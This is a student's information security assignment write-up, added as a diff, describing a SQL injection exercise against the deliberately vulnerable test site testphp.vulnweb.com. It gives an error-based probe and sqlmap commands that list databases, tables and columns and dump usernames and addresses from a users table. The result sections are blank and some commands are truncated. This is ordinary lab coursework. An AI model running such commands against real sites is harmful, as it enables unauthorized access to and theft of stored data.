@@ -1,0 +1,73 @@
+** Sir this is in case we needed to submit text here as well, I have added the screenshots in the google doc, because it was the only tool I could think off to use on KALI. This text is in a better format on the google doc link I have shared, thanks a lot!!"
+
+
+Name: Muhammad Aneeq Aamir
+Roll Number: 231465792
+
+Assignment Title: Assignment 1 - Performing a SQL Injection Attack
+
+Course Title: Information Security - Section A
+
+Steps and Commands:
+
+Opening up by virtual box machine and logging in to Kali.
+
+
+Loading up Firefox and opening up "http://vulnweb.com/".
+
+
+I selected this website to perform the test: "http://testphp.vulnweb.com/"
+
+
+Opening the artists page and clicking on the first artist. The page redirects to this URL: "http://testphp.vulnweb.com/artists.php?artist=1"
+
+
+Changing the URL to "http://testphp.vulnweb.com/artists.php?artist=1'" to check whether we can get access or not.
+
+The page returns this error: "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62", this shows website is vulnerable.
+
+
+After this we open up our Terminal.
+
+
+First command we write is: "sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --dbs", this is done to fetch the databases available on the website.
+
+The results we get are: 
+
+
+In these results we get two table names: acuart and information_schema, for this attack we will be using the table acuart.
+Second command which we use is: “sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables”, this command is used to fetch the tables in the table ‘acuart’
+
+
+The results we get are:
+
+
+We got a total of 8 tables, but for this attack we will use the table ‘users’.
+The third command we use is “-u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns”, this is used to fetch all the columns in the table ‘users’.
+
+
+
+
+And the results we get are:
+
+
+
+We have got 8 columns, but for this attack we will be using 2 of them, “uname” for the Username of the Admin and “address” for the Address of the Admin.
+ The fourth command is: “-u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump”.This command is used to fetch the username of the Admin.
+
+The results are: 
+
+
+
+Here we can see, the username of the Admin is “test”.
+
+
+
+
+Fifth command is: “-u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C address -dump”, this command is used to fetch the Address of the Admin.
+
+
+The results are:
+
+
+Here we can see, the address of the Admin is “21 street”.
